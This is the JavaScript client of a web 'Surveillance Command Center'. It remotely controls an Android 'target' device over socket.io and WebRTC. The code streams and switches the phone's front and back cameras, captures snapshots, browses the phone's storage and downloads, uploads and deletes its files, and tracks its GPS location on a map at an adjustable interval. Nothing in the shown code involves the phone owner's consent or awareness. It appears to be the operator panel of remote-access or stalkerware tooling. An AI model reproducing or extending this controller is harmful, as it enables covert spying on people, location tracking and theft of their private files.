// Surveillance Command Center Core Client Logic

function getServerURL() {
  const hostname = window.location.hostname;
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }
  return `http://${hostname}:3000`;
}

const socket = io(getServerURL(), {
  reconnection: true,
  reconnectionAttempts: 15,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  randomizationFactor: 0.5
});

// ── DOM Elements ──────────────────────────────────────────────
// Video Sinks & Viewport
const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const tagFront = document.getElementById('tagFront');
const tagBack = document.getElementById('tagBack');
const cameraViewport = document.getElementById('cameraViewport');
const activeCameraLabel = document.getElementById('activeCameraLabel');
const tagActiveCamera = document.getElementById('tagActiveCamera');

// Camera Controls
const btnStartStream = document.getElementById('btnStartStream');
const btnStopStream = document.getElementById('btnStopStream');
const btnSwitchCameraTop = document.getElementById('btnSwitchCameraTop');
const btnSwitchCameraTopText = document.getElementById('btnSwitchCameraTopText');
const videoQualitySelect = document.getElementById('videoQualitySelect');
const btnSnapActive = document.getElementById('btnSnapActive');
const btnFullscreenCamera = document.getElementById('btnFullscreenCamera');

// Snapshot Modal
const snapshotModal = document.getElementById('snapshotModal');
const snapshotPreview = document.getElementById('snapshotPreview');
const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');

// Connection & Device Badges
const statusDiv = document.getElementById('status');
const retryButton = document.getElementById('retryButton');
const debugLog = document.getElementById('debugLog');
const deviceBadge = document.getElementById('deviceBadge');
const infoModel = document.getElementById('infoModel');
const infoBattery = document.getElementById('infoBattery');

// File Explorer
const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');
const fsUploadArea = document.getElementById('fsUploadArea');
const fsUploadInput = document.getElementById('fsUploadInput');
const fsUploadLabel = document.getElementById('fsUploadLabel');
const fsUploadProgress = document.getElementById('fsUploadProgress');

// GPS Map Controls
const gpsIntervalSelect = document.getElementById('gpsIntervalSelect');
const btnRefreshLocation = document.getElementById('btnRefreshLocation');

// ── State Variables ───────────────────────────────────────────
let peer = null;
let myId = null;
let androidClientId = null;
let map = null;
let marker = null;
let frontVideoTrack = null;
let backVideoTrack = null;
let currentActiveCamera = 'front';
let isCameraStreamingActive = false;
let currentPath = "/storage/emulated/0/";
let currentSnapshotBase64 = null;
let activeDownloads = {};

const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

// ─────────────────────────────────────────────────────────────
// Diagnostics & Status
// ─────────────────────────────────────────────────────────────

function updateStatus(message) {
  console.log(message);
  if (statusDiv) statusDiv.textContent = message;
  logDebug(message);
  if (retryButton) {
    retryButton.style.display = (message.includes('Failed') || message.includes('disconnected')) ? 'block' : 'none';
  }
}

function logDebug(message) {
  if (!debugLog) return;
  const logEntry = document.createElement('div');
  logEntry.className = 'terminal-entry';
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 50) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function reconnectSocket() {
  updateStatus('Reconnecting to server...');
  socket.connect();
}

if (retryButton) {
  retryButton.addEventListener('click', reconnectSocket);
}

// ─────────────────────────────────────────────────────────────
// On-Demand Stream Controls
// ─────────────────────────────────────────────────────────────

function updateStreamControlUI(isStreaming) {
  isCameraStreamingActive = isStreaming;
  if (btnStartStream) {
    btnStartStream.disabled = isStreaming;
    btnStartStream.style.opacity = isStreaming ? '0.4' : '1';
  }
  if (btnStopStream) {
    btnStopStream.disabled = !isStreaming;
    btnStopStream.style.opacity = !isStreaming ? '0.4' : '1';
  }
  if (tagActiveCamera) {
    if (isStreaming) {
      tagActiveCamera.textContent = 'STREAMING';
      tagActiveCamera.style.background = 'rgba(16, 185, 129, 0.2)';
      tagActiveCamera.style.color = 'var(--success)';
      tagActiveCamera.style.borderColor = 'var(--success)';
      logDebug('[STREAM] Camera stream active on device');
    } else {
      tagActiveCamera.textContent = 'STANDBY';
      tagActiveCamera.style.background = 'rgba(234, 179, 8, 0.12)';
      tagActiveCamera.style.color = 'var(--warning)';
      tagActiveCamera.style.borderColor = 'var(--warning)';
      logDebug('[STREAM] Camera stream stopped (standby mode)');
    }
  }
}

if (btnStartStream) {
  btnStartStream.addEventListener('click', () => {
    if (!androidClientId) {
      logDebug('[STREAM] No Android device connected');
      return;
    }
    logDebug('[CMD] Sending cmd:start_camera to device');
    socket.emit('cmd:start_camera', { to: androidClientId });
    updateStreamControlUI(true);
  });
}

if (btnStopStream) {
  btnStopStream.addEventListener('click', () => {
    if (!androidClientId) return;
    logDebug('[CMD] Sending cmd:stop_camera to device');
    socket.emit('cmd:stop_camera', { to: androidClientId });
    updateStreamControlUI(false);
  });
}

// ─────────────────────────────────────────────────────────────
// Camera Switching & Resolution
// ─────────────────────────────────────────────────────────────

function updateCameraUI(activeCam) {
  currentActiveCamera = activeCam;
  logDebug(`[UI] Active camera set to: ${activeCam.toUpperCase()}`);

  if (activeCam === 'front') {
    if (videoFront) videoFront.style.display = 'block';
    if (videoBack) videoBack.style.display = 'none';
    if (activeCameraLabel) activeCameraLabel.textContent = 'Kamera Depan (Front Camera)';
    if (btnSwitchCameraTopText) {
      btnSwitchCameraTopText.textContent = 'Ganti ke Kamera Belakang 🔄';
    }
  } else {
    if (videoFront) videoFront.style.display = 'none';
    if (videoBack) videoBack.style.display = 'block';
    if (activeCameraLabel) activeCameraLabel.textContent = 'Kamera Belakang (Back Camera)';
    if (btnSwitchCameraTopText) {
      btnSwitchCameraTopText.textContent = 'Ganti ke Kamera Depan 🔄';
    }
  }
}

function requestCameraSwitch(targetCam) {
  if (!androidClientId) {
    logDebug('Cannot switch camera: Android device not paired yet');
    return;
  }
  const nextCam = targetCam || (currentActiveCamera === 'front' ? 'back' : 'front');
  logDebug(`[CMD] Requesting camera switch -> ${nextCam.toUpperCase()}`);
  socket.emit('cmd:camera_switch', { to: androidClientId, camera: nextCam });
  updateCameraUI(nextCam);
}

if (btnSwitchCameraTop) {
  btnSwitchCameraTop.addEventListener('click', () => {
    requestCameraSwitch();
  });
}

socket.on('camera_switched', (data) => {
  if (data && data.activeCamera) {
    logDebug(`[WebRTC] Camera confirmed switched to: ${data.activeCamera}`);
    updateCameraUI(data.activeCamera);
  }
});

socket.on('camera_status', (data) => {
  if (data && data.streaming !== undefined) {
    logDebug(`[STREAM] Camera status from device: streaming=${data.streaming}`);
    updateStreamControlUI(data.streaming);
  }
});

if (videoQualitySelect) {
  videoQualitySelect.addEventListener('change', (e) => {
    if (!androidClientId) return;
    const quality = e.target.value;
    logDebug(`[CMD] Changing video streaming quality: ${quality}`);
    socket.emit('cmd:set_quality', { to: androidClientId, quality: quality });
  });
}

// Fullscreen Camera
if (btnFullscreenCamera && cameraViewport) {
  btnFullscreenCamera.addEventListener('click', () => {
    if (!document.fullscreenElement) {
      cameraViewport.requestFullscreen().catch(err => {
        logDebug(`Fullscreen error: ${err.message}`);
      });
    } else {
      document.exitFullscreen();
    }
  });
}

// ─────────────────────────────────────────────────────────────
// Photo Snapshot Handling
// ─────────────────────────────────────────────────────────────

if (btnSnapActive) {
  btnSnapActive.addEventListener('click', () => {
    if (!androidClientId) {
      logDebug('Cannot take photo: Android device not connected');
      return;
    }
    const isFront = (currentActiveCamera === 'front');
    logDebug(`[CMD] Capturing snapshot: ${isFront ? 'Front' : 'Back'} lens`);
    socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: isFront });
  });
}

socket.on('snapshot_data', data => {
  if (data && data.snapshot) {
    logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
    currentSnapshotBase64 = data.snapshot.image;
    if (snapshotPreview && snapshotModal) {
      snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
      snapshotModal.classList.add('active');
    }
  }
});

if (btnCloseSnapshot && snapshotModal) {
  btnCloseSnapshot.addEventListener('click', () => {
    snapshotModal.classList.remove('active');
    if (snapshotPreview) snapshotPreview.src = '';
    currentSnapshotBase64 = null;
  });
}

if (btnDownloadSnapshot) {
  btnDownloadSnapshot.addEventListener('click', () => {
    if (currentSnapshotBase64) {
      downloadBase64File(currentSnapshotBase64, `surveillance_snap_${Date.now()}.jpg`);
    }
  });
}

// ─────────────────────────────────────────────────────────────
// File Storage Browser
// ─────────────────────────────────────────────────────────────

function requestFileList(path) {
  if (!androidClientId) {
    updateStatus('No Android client connected');
    return;
  }
  updateStatus(`Requesting files: ${path}`);
  socket.emit('fs:list', { to: androidClientId, path: path });
}

function renderFileList(files, path) {
  if (path) {
    currentPath = path;
    if (fsPathInput) fsPathInput.value = path;
  }
  if (!fileListDiv) return;
  fileListDiv.innerHTML = '';
  
  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">This directory is empty.</div>';
    return;
  }

  // Sort Directories first
  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  files.forEach(file => {
    const item = document.createElement('div');
    item.className = 'file-item';

    const icon = document.createElement('span');
    icon.className = 'file-icon';
    icon.textContent = file.isDir ? '📁' : '📄';

    const info = document.createElement('div');
    info.className = 'file-info';
    
    const name = document.createElement('div');
    name.className = 'file-name';
    name.textContent = file.name;
    if (file.isDir) name.style.color = 'var(--primary)';

    const size = document.createElement('div');
    size.className = 'file-size';
    size.textContent = file.isDir ? 'Folder' : formatBytes(file.size);

    info.appendChild(name);
    info.appendChild(size);

    const actions = document.createElement('div');
    actions.className = 'file-actions';
    
    if (!file.isDir) {
      const downloadBtn = document.createElement('button');
      downloadBtn.className = 'btn-file-action download';
      downloadBtn.title = 'Download';
      downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
      downloadBtn.onclick = (e) => {
        e.stopPropagation();
        requestFileDownload(file.path);
      };
      actions.appendChild(downloadBtn);
    }
    
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'btn-file-action delete';
    deleteBtn.title = 'Delete';
    deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
    deleteBtn.onclick = (e) => {
      e.stopPropagation();
      if (confirm(`Permanently delete ${file.name}?`)) {
        deleteFile(file.path);
      }
    };
    actions.appendChild(deleteBtn);

    item.appendChild(icon);
    item.appendChild(info);
    item.appendChild(actions);

    if (file.isDir) {
      item.onclick = () => requestFileList(file.path);
    }

    fileListDiv.appendChild(item);
  });
}

function formatBytes(bytes) {
  if (!bytes || bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function requestFileDownload(path) {
  updateStatus(`Starting download: ${path}`);
  if (androidClientId) {
    socket.emit('fs:download', { to: androidClientId, path: path });
  }
}

function deleteFile(path) {
  updateStatus(`Requesting deletion: ${path}`);
  if (androidClientId) {
    socket.emit('fs:delete', { to: androidClientId, path: path });
  }
}

if (fsGoBtn && fsPathInput) {
  fsGoBtn.addEventListener('click', () => {
    requestFileList(fsPathInput.value);
  });
}

if (fsBackBtn) {
  fsBackBtn.addEventListener('click', () => {
    let path = currentPath;
    if (path.endsWith('/')) path = path.slice(0, -1);
    if (path === '') path = '/';
    
    const lastSlash = path.lastIndexOf('/');
    if (lastSlash !== -1) {
      const parent = path.substring(0, lastSlash + 1) || '/'; 
      requestFileList(parent);
    } else {
      requestFileList('/');
    }
  });
}

// Drag and drop uploader
if (fsUploadArea && fsUploadInput) {
  fsUploadArea.addEventListener('click', () => {
    fsUploadInput.click();
  });

  fsUploadInput.addEventListener('change', (e) => {
    if (e.target.files.length > 0) {
      uploadTargetFile(e.target.files[0]);
    }
  });

  fsUploadArea.addEventListener('dragover', (e) => {
    e.preventDefault();
    fsUploadArea.style.borderColor = 'var(--primary)';
    fsUploadArea.style.background = 'rgba(0, 240, 255, 0.04)';
  });

  ['dragleave', 'dragend', 'drop'].forEach(evt => {
    fsUploadArea.addEventListener(evt, () => {
      fsUploadArea.style.borderColor = 'rgba(255,255,255,0.08)';
      fsUploadArea.style.background = 'rgba(0,0,0,0.15)';
    });
  });

  fsUploadArea.addEventListener('drop', (e) => {
    e.preventDefault();
    if (e.dataTransfer.files.length > 0) {
      uploadTargetFile(e.dataTransfer.files[0]);
    }
  });
}

function uploadTargetFile(file) {
  if (!androidClientId) {
    logDebug('Cannot upload file, no device paired');
    return;
  }
  
  logDebug(`[FS] Uploading: ${file.name} (${formatBytes(file.size)})`);
  if (fsUploadLabel) fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;
  if (fsUploadProgress) fsUploadProgress.style.width = '0%';
  
  const reader = new FileReader();
  reader.onload = async (event) => {
    const rawBuffer = event.target.result;
    const chunkSize = 64 * 1024; // 64 KB chunks
    const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);
    
    socket.emit('fs:upload_start', {
      to: androidClientId,
      filename: file.name,
      parentPath: currentPath,
      totalChunks: totalChunks
    });
    
    for (let idx = 0; idx < totalChunks; idx++) {
      const start = idx * chunkSize;
      const end = Math.min(start + chunkSize, rawBuffer.byteLength);
      const slice = rawBuffer.slice(start, end);
      
      const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
      const base64 = btoa(binary);
      
      socket.emit('fs:upload_chunk', {
        to: androidClientId,
        chunk: base64
      });
      
      const pct = Math.floor(((idx + 1) / totalChunks) * 100);
      if (fsUploadProgress) fsUploadProgress.style.width = `${pct}%`;
      if (fsUploadLabel) fsUploadLabel.textContent = `Uploading ${file.name}... (${pct}%)`;
      
      await new Promise(r => setTimeout(r, 10));
    }
    
    socket.emit('fs:upload_complete', { to: androidClientId });
    if (fsUploadLabel) fsUploadLabel.textContent = 'Upload Completed successfully';
    logDebug(`[FS] File uploaded: ${file.name}`);
    setTimeout(() => {
      if (fsUploadLabel) fsUploadLabel.textContent = 'Drag files here or click to upload';
      if (fsUploadProgress) fsUploadProgress.style.width = '0%';
    }, 3000);
  };
  
  reader.readAsArrayBuffer(file);
}

// File Explorer Socket Subscriptions
socket.on('fs:files', data => {
  logDebug('Refreshing explorer directory tree');
  if (data && data.file_list) {
    renderFileList(data.file_list.files, data.file_list.currentPath);
  }
});

socket.on('fs:delete_result', data => {
  logDebug(`[FS] Delete result: ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
  updateStatus(data.success ? 'Deleted file successfully' : 'Failed to delete target file');
  requestFileList(currentPath);
});

socket.on('fs:download_start', data => {
  const { fileId, name, size, totalChunks } = data;
  logDebug(`[FS] Starting download: ${name} (${formatBytes(size)})`);
  activeDownloads[fileId] = {
    name: name,
    buffer: new Array(totalChunks),
    totalChunks: totalChunks,
    receivedChunks: 0,
    startTime: Date.now()
  };
  updateStatus(`Downloading ${name} (0%)`);
});

socket.on('fs:download_chunk', data => {
  const { fileId, chunkIndex, content } = data;
  const download = activeDownloads[fileId];
  if (download) {
    if (!download.buffer[chunkIndex]) {
      download.buffer[chunkIndex] = content;
      download.receivedChunks++;
    }
    const pct = Math.floor((download.receivedChunks / download.totalChunks) * 100);
    if (pct % 10 === 0) {
      updateStatus(`Downloading ${download.name} (${pct}%)`);
    }
  }
});

socket.on('fs:download_complete', data => {
  const { fileId } = data;
  const download = activeDownloads[fileId];
  if (download) {
    logDebug(`[FS] Download completed: ${download.name}`);
    updateStatus(`Saving ${download.name}...`);
    
    const base64Complete = download.buffer.join('');
    downloadBase64File(base64Complete, download.name);
    
    const duration = ((Date.now() - download.startTime) / 1000).toFixed(1);
    updateStatus(`Downloaded ${download.name} in ${duration}s`);
    delete activeDownloads[fileId];
  }
});

socket.on('fs:download_error', data => {
  const { fileId, error } = data;
  if (activeDownloads[fileId]) {
    updateStatus(`Download error: ${activeDownloads[fileId].name}`);
    delete activeDownloads[fileId];
  }
  logDebug(`[FS] Download fail: ${error}`);
});

function downloadBase64File(base64Data, fileName) {
  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
  const downloadLink = document.createElement("a");
  downloadLink.href = linkSource;
  downloadLink.download = fileName;
  downloadLink.click();
}

// ─────────────────────────────────────────────────────────────
// GPS Map Tracking
// ─────────────────────────────────────────────────────────────

function initMap() {
  try {
    const mapEl = document.getElementById('mapContainer');
    if (!mapEl) return;
    map = L.map('mapContainer', { zoomControl: false }).setView([0, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '© OpenStreetMap contributors, © CARTO'
    }).addTo(map);
    L.control.zoom({ position: 'bottomright' }).addTo(map);
    logDebug('Dark Maps initialized');
  } catch (e) {
    console.error('Map init failed:', e);
  }
}

function updateMap(latitude, longitude) {
  if (!map) initMap();
  try {
    if (marker) {
      marker.setLatLng([latitude, longitude]);
    } else {
      marker = L.marker([latitude, longitude]).addTo(map);
      marker.bindPopup('Active Device').openPopup();
    }
    map.setView([latitude, longitude], 15);
    logDebug(`Map coordinates: lat=${latitude.toFixed(5)}, lng=${longitude.toFixed(5)}`);
  } catch (e) {
    console.error('Map update failed:', e);
  }
}

socket.on('location', data => {
  if (data && data.latitude !== undefined && data.longitude !== undefined) {
    updateMap(data.latitude, data.longitude);
  }
});

if (gpsIntervalSelect) {
  gpsIntervalSelect.addEventListener('change', (e) => {
    if (!androidClientId) return;
    const val = parseInt(e.target.value);
    logDebug(`[CMD] Setting GPS Polling interval: ${val}ms`);
    socket.emit('cmd:set_gps_interval', { to: androidClientId, intervalMs: val });
  });
}

if (btnRefreshLocation) {
  btnRefreshLocation.addEventListener('click', () => {
    if (!androidClientId) return;
    logDebug('[CMD] Refreshing location');
    socket.emit('cmd:ping', { to: androidClientId });
  });
}

// ─────────────────────────────────────────────────────────────
// WebRTC Stream Management
// ─────────────────────────────────────────────────────────────

function updateStreams() {
  if (frontVideoTrack) {
    const frontStream = new MediaStream([frontVideoTrack]);
    videoFront.srcObject = frontStream;
    videoFront.muted = true;
    videoFront.play().catch(e => console.warn('Autoplay front error:', e));
  }
  if (backVideoTrack) {
    const backStream = new MediaStream([backVideoTrack]);
    videoBack.srcObject = backStream;
    videoBack.muted = true;
    videoBack.play().catch(e => console.warn('Autoplay back error:', e));
  }
  updateCameraUI(currentActiveCamera);
}

// ─────────────────────────────────────────────────────────────
// Socket Server Subscriptions
// ─────────────────────────────────────────────────────────────

socket.on('connect', () => {
  updateStatus('Connected to Command server');
});

socket.on('connect_error', () => {
  updateStatus('Failed to connect to signaling host');
});

socket.on('id', id => {
  myId = id;
  logDebug(`Session ID: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
});

socket.on('android-client-ready', id => {
  if (androidClientId !== id) {
    androidClientId = id;
    logDebug(`Android target identified: ${id}`);
    updateStatus('Session established with device');
    requestFileList(currentPath);
  }
});

socket.on('device_info', info => {
  if (!info) return;
  logDebug(`Device: ${info.model || 'Unknown'} (${info.manufacturer || ''})`);
  
  if (deviceBadge) {
    deviceBadge.style.display = 'flex';
  }
  if (infoModel) {
    infoModel.textContent = info.model || 'Android Device';
  }
  if (infoBattery && info.battery !== undefined) {
    infoBattery.textContent = `${info.battery}%`;
    if (info.battery <= 15) {
      infoBattery.style.color = 'var(--danger)';
    } else if (info.battery <= 35) {
      infoBattery.style.color = 'var(--warning)';
    } else {
      infoBattery.style.color = 'var(--success)';
    }
  }
});

socket.on('signal', async (data) => {
  const { from, signal } = data;
  
  if (!androidClientId || androidClientId !== from) {
    androidClientId = from;
    updateStatus('Android device detected');
  }

  if (!peer) {
    logDebug('Initializing WebRTC RTCPeerConnection');
    try {
      peer = new RTCPeerConnection(rtcConfig);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });

      peer.ontrack = (event) => {
        const track = event.track;
        console.log('[WebRTC] ontrack received:', track.kind, 'id:', track.id);
        logDebug(`[WebRTC] Received ${track.kind} track (id: ${track.id})`);

        if (track.kind === 'video') {
          const trackId = (track.id || '').toLowerCase();
          if (trackId.includes('front') || trackId === 'front_camera' || trackId === 'front_video') {
            frontVideoTrack = track;
            logDebug('[WebRTC] Front camera track mapped');
          } else if (trackId.includes('back') || trackId.includes('rear') || trackId === 'back_camera' || trackId === 'back_video') {
            backVideoTrack = track;
            logDebug('[WebRTC] Back camera track mapped');
          } else {
            if (!frontVideoTrack) {
              frontVideoTrack = track;
              logDebug('[WebRTC] Assigned video track to Front Camera (auto)');
            } else if (!backVideoTrack) {
              backVideoTrack = track;
              logDebug('[WebRTC] Assigned video track to Back Camera (auto)');
            }
          }
          updateStreams();
        }
      };

      peer.onicecandidate = e => {
        if (e.candidate) {
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      peer.oniceconnectionstatechange = () => {
        updateStatus(`WebRTC: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') {
          updateStatus('Connection failed. Refresh or retry.');
        }
      };
    } catch (err) {
      console.error('Failed to create peer connection:', err);
    }
  }

  try {
    if (signal.type === 'offer') {
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      await peer.setLocalDescription(answer);
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal.candidate) {
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Signal parsing error:', err);
  }
});

socket.on('android-client-disconnected', () => {
  updateStatus('Android target disconnected');
  if (peer) {
    peer.close();
    peer = null;
  }
  if (videoFront) videoFront.srcObject = null;
  if (videoBack) videoBack.srcObject = null;
  
  updateStreamControlUI(false);
  androidClientId = null;
  
  if (deviceBadge) {
    deviceBadge.style.display = 'none';
  }
  if (marker) {
    marker.remove();
    marker = null;
  }
});

socket.on('error', (error) => {
  updateStatus(`Signal Error: ${error.message}`);
});

// Initialize on page load
updateStatus('Connecting to signaling...');
initMap();
updateCameraUI('front');